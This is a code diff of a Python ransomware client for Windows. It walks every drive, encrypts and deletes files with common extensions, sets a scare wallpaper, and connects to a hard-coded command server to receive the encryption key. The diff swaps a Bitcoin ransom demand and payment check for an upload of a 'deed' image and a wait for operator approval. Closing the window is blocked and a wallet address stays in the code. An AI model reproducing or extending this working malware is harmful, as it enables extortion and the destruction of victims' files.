@@ -1,6 +1,8 @@
 from cryptography.fernet import Fernet
 import os
 import tkinter as tk
+from PIL import ImageTk, Image
+from tkinter import filedialog
 from socket import *
 import rsa
 import pickle
@@ -9,8 +11,9 @@ import win32con
 from win32 import win32api
 from tkinter import Text
 from datetime import datetime, timedelta
-from threading import Thread
+from threading import Thread, Event
 import time
+import sys
 
 
 class Timer:
@@ -48,7 +51,7 @@ class Encrypt(Thread):
     def __init__(self, cur_drive, key):
         Thread.__init__(self)
         self.drive = cur_drive
-        self.fernet = Fernet(key)
+        self.fernet = Fernet(key)  # Generate a Fernet type object
         self.accepted_extensions = [
                                     "Sxw",
                                     "stw",
@@ -216,8 +219,8 @@ class Encrypt(Thread):
                                     "aes",
                                     "gpg",
                                     "vmx",
-                                    ]
-        self.max_size = 1500000000
+                                    ]  # List all extensions
+        self.max_size = 1500000000  # A single file being over 1.5 GB is simply not ideal and would never hold important data
         self.my_files = ['cmFuc29tbm90ZQ==.txt',
                          'cmVk.png', 'eW9r.png',
                          'eW9rMg==.png', 'main.py',
@@ -226,14 +229,15 @@ class Encrypt(Thread):
                          'Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg',
                          'Y2xhc3MgYWxlcnQ=.PNG',
                          'Yml0Y29pbg==.png',
-                         'Z3JlZW4=.png', 'main', 'main.exe']
+                         'Z3JlZW4=.png', 'main', 'main.exe']  # The files that need to run with the System.
         self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
                         'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
                         'swapfile.sys', 'System Volume Information', 'Windows'}
 
-    def run(self):
-        for root, dirs, filenames in os.walk(self.drive, topdown=True):
-            dirs[:] = [d for d in dirs if d not in self.exclude]
+    def run(self):  # Override the Thread(run) function.
+        global stop_thread
+        for root, dirs, filenames in os.walk(self.drive, topdown=True):  # Start scanning a single drive
+            dirs[:] = [d for d in dirs if d not in self.exclude]  # Exclude folders that shouldn't be entered.
             for file in filenames:
                 if file.split(".")[-1] in self.accepted_extensions and file not in self.my_files:
                     filepath = os.path.join(root, file)
@@ -244,9 +248,9 @@ class Encrypt(Thread):
                         try:
                             with open(filepath, 'rb') as byte_file:
                                 enc_file_content = self.fernet.encrypt(byte_file.read())
-                                os.remove(filepath)
-                                with open(enc_file_name, 'x') as encrypted_file:
-                                    encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
+                            os.remove(filepath)
+                            with open(enc_file_name, 'x') as encrypted_file:  # Encrypt
+                                encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                         except FileExistsError as _fileExists:
                             index = 0
                             while True:
@@ -262,6 +266,8 @@ class Encrypt(Thread):
                             pass
                         except ValueError as _ValueError:
                             pass
+            if stop_thread.is_set():  # Break if the Encrypting hasn't finished but the decrypting has started.
+                break
 
 
 class Decrypt(Thread):
@@ -274,7 +280,7 @@ class Decrypt(Thread):
                         'swapfile.sys', 'System Volume Information', 'Windows'}
 
     def run(self):
-        print(f"Started denrypting drive {self.drive}")
+        print(f"Started decrypting drive {self.drive}")
         for r, dirs, f in os.walk(self.drive):
             dirs[:] = [d for d in dirs if d not in self.exclude]
             for file in f:
@@ -295,8 +301,9 @@ class Decrypt(Thread):
 
 class RansomwareClient:
     def __init__(self):
-        host = '139.162.131.50'
+        host = '212.143.57.95'
         port = 17694
+        self.BUFFER_SIZE = 4096
         self.my_socket = socket()
         while True:
             try:
@@ -306,58 +313,89 @@ class RansomwareClient:
                 time.sleep(5)  # Buffer for 5 seconds
         publickey, privatekey = rsa.newkeys(512)
         self.my_socket.send(pickle.dumps((publickey, gethostname())))
-        received_key = pickle.loads(self.my_socket.recv(1024))
+        received_key = pickle.loads(self.my_socket.recv(self.BUFFER_SIZE))
         symmetric_key = rsa.decrypt(received_key, privatekey)
         self.fernet = Fernet(symmetric_key)
 
-    def check_payment(self, transaction_id):
-        self.my_socket.send(self.fernet.encrypt(transaction_id.encode()))
-        print("sent the api request")
-        answer = pickle.loads(self.fernet.decrypt(self.my_socket.recv(1024)))  # CODES:
-        if type(answer) is bool:
-            return answer
-        return False
+    def check_deed(self, image_loc):
+        if image_loc:
+            with open(image_loc, 'rb') as deed_file:
+                self.my_socket.send(str(os.stat(image_loc).st_size).encode())
+                image_data = deed_file.read(self.BUFFER_SIZE)
+                while image_data:
+                    self.my_socket.send(image_data)
+                    image_data = deed_file.read(self.BUFFER_SIZE)
+            answer = pickle.loads(self.my_socket.recv(self.BUFFER_SIZE))
+            if type(answer) is bool:
+                return answer
+            return False
 
     def get_key(self):
         self.my_socket.send(self.fernet.encrypt("sendkey".encode()))
-        return self.fernet.decrypt(self.my_socket.recv(1024))
+        return self.fernet.decrypt(self.my_socket.recv(self.BUFFER_SIZE))
+
+    def waiting(self):
+        answer = self.my_socket.recv(self.BUFFER_SIZE)
+        return pickle.loads(answer)
 
 
 class Interface:
-    def __init__(self, my_client):
+    def __init__(self, my_client, key):
         self.root = tk.Tk()
         self.root.title('DO NOT CLOSE THIS WINDOW')
         self.root.resizable(False, False)
         self.canvas = tk.Canvas(self.root, height=800, width=1250, bg="#841212")
         self.canvas.pack()
         self.canDecrypt = False
+        self.waiting_approval = False
         self.text_list = []
         self.clock = tk.Label(self.root, height=1, background="#000000", foreground='white', font=("Lemon Milk", 20),
                               text="00:00:00")
-        self.timer = Timer(root=self.root, hours=23, minutes=59, seconds=59, clock=self.clock)
+        # self.timer = Timer(root=self.root, hours=23, minutes=59, seconds=59, clock=self.clock)
         self.client = my_client
         self.client_transaction_id = Text(self.root, height=2, width=40)
+        self.KEY_SYMMETRIC = key
 
     def disable_event(self):
         if self.canDecrypt:
             self.root.destroy()
 
     def decryption_start(self):
+        global stop_thread
+        global waiting_approval
         if self.canDecrypt:
+            stop_thread.set()
             decrypt_drives = win32api.GetLogicalDriveStrings()
             decrypt_drives = decrypt_drives.split('\000')[:-1]
             for dec_drive in decrypt_drives:
-                Decrypt(dec_drive, SYMMETRIC_KEY).start()
+                Decrypt(dec_drive, self.KEY_SYMMETRIC).start()
             self.canvas['background'] = '#558c0d'
             self.canvas.delete('all')
             self.clock.destroy()
             self.canvas.create_image(125, 140, image=tk.PhotoImage(file="Z3JlZW4=.png"))
             for textbox in self.text_list:
                 textbox.destroy()
+        elif self.waiting_approval:
+            self.canvas.delete('all')
+            for textbox in self.text_list:
+                textbox.destroy()
+            self.canvas['background'] = '#1900ff'
+            waiting_approval = tk.Label(self.root, text="WAITING APPROVAL \n PLEASE DO NOT CLOSE THIS WINDOW",
+                                        height=10)
+            waiting_approval.place(x=625, y=400, anchor='center')
+            self.text_list.append(waiting_approval)
+            self.canvas.update()
+            approved = self.client.waiting()
+            if approved:
+                self.canDecrypt = True
+                self.decryption_start()
+            else:
+                # waiting_approval.destory()
+                self.canvas['background'] = '#841212'
+                self.run()
 
-    def check_payment(self):
-        transaction_id = self.client_transaction_id.get("1.0", tk.END + "-1c")
-        self.canDecrypt = self.client.check_payment(transaction_id)
+    def check_deed(self):
+        self.waiting_approval = self.client.check_deed(self.root.filename)
         self.decryption_start()
 
     def copy_address(self):
@@ -367,29 +405,16 @@ class Interface:
         r.clipboard_append("37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv")
         r.destroy()
 
+    def open_file(self):
+        global my_image
+        self.root.filename = filedialog.askopenfilename(title="Select A File", filetypes=[("png files", "*.png")])
+        my_image = tk.PhotoImage(file=self.root.filename)
+        self.canvas.create_image(750, 650, image=my_image)
+        deed_button = tk.Button(self.root, text="Upload image to server", command=self.check_deed)
+        deed_button.place(x=850, y=700)
+        self.text_list.append(deed_button)
+
     def run(self):
-        transaction_id_writing = tk.Label(self.root, text="Transaction id here:", height=2)
-        transaction_id_writing.place(x=430, y=760)
-        self.text_list.append(transaction_id_writing)
-
-        # BITCOIN WALLET
-        my_wallet_id = tk.Label(self.root, text="BITCOIN ADDRESS: 37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv", height=2)
-        my_wallet_id.place(x=835, y=570)
-        self.text_list.append(my_wallet_id)
-
-        # VICTIM'S TRANSACTION ID
-        self.client_transaction_id.place(x=550, y=760)
-        self.text_list.append(self.client_transaction_id)
-
-        # LOST FILES
-        currentTimeDate = datetime.now() + timedelta(days=1)
-        currentTime = currentTimeDate.strftime('%Y-%m-%d %H:%M')
-        lost_files = tk.Label(self.root, text=f"Your files will be lost on \n{currentTime}\n\n Time Left:", fg='yellow',
-                              bg='#841212',
-                              font=("Arial", 15))
-        lost_files.place(x=20, y=280)
-        self.text_list.append(lost_files)
-
         # INFO BOX
 
         with open(r'cmFuc29tbm90ZQ==.txt', 'r') as ransomnote_file:
@@ -407,39 +432,6 @@ class Interface:
         do_not_close.place(x=0, y=550)
         self.text_list.append(do_not_close)
 
-        # SEND MONEY
-        send_money = tk.Label(self.root, text="-------->\nSend 400$\n worth of bitcoin\n to this address", height=11,
-                              width=15,
-                              anchor='n')
-        send_money.place(x=720, y=570)
-        self.text_list.append(send_money)
-        # --------- BUTTONS ------------
-        # A BUTTON TO CHECK PAYMENT
-        CheckPayment = tk.Button(self.root, text="Check Payment", fg="black", bg="white", padx=130, pady=5,
-                                 command=self.check_payment)
-        CheckPayment.place(x=900, y=760)
-        self.text_list.append(CheckPayment)
-
-        # A BUTTON TO COPY THE ADDRESS TO CLIPBOARD
-        CopyAddress = tk.Button(self.root, text="Copy", fg="black", bg="white", padx=25, pady=5,
-                                command=self.copy_address)
-        CopyAddress.place(x=1160, y=570)
-        self.text_list.append(CopyAddress)
-
-        # --------- IMAGES ------------
-        # BITCOIN ACCEPTED HERE SIGN
-        bitcoin_accepted_here = tk.PhotoImage(file="Yml0Y29pbg==.png")
-        self.canvas.create_image(1040, 680, image=bitcoin_accepted_here)
-
-        # QR CODE
-        qr_code = tk.PhotoImage(file="Y2xhc3MgYWxlcnQ=.PNG")
-        self.canvas.create_image(627, 660, image=qr_code)
-
-        # RED LOCK
-
-        red_lock = tk.PhotoImage(file="cmVk.png")
-        self.canvas.create_image(125, 140, image=red_lock)
-
         # YOK
         yok = tk.PhotoImage(file="eW9r.png")
         self.canvas.create_image(400, 180, image=yok)
@@ -448,7 +440,11 @@ class Interface:
         yok2 = tk.PhotoImage(file="eW9rMg==.png")
         self.canvas.create_image(400, 540, image=yok2)
 
-        self.timer.start_clock()
+        # UPLOAD A FILE
+        upload_file = tk.Button(self.root, text="Choose file to upload", command=self.open_file)
+        upload_file.pack()
+        self.text_list.append(upload_file)
+
         self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
         self.root.mainloop()
 
@@ -462,7 +458,8 @@ def set_wallpaper(path):
 
 
 if __name__ == "__main__":
-    time.sleep(60)
+    # time.sleep(60)
+    stop_thread = Event()
     client = RansomwareClient()
     SYMMETRIC_KEY = client.get_key()
     if not os.path.exists('16jXldem15Qg15zXqdeq15XXqj8g16rXkdeZ15Ag15HXnNeV15LXlAo=.SHAOOLY'):
@@ -482,7 +479,7 @@ if __name__ == "__main__":
             t.start()
         t.join()
         set_wallpaper("Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg")
-    my_interface = Interface(client)
+    my_interface = Interface(client, SYMMETRIC_KEY)
     my_interface.run()  # NOTE: The interface will be started last.
 
     # change the wallpaper to scare the user.
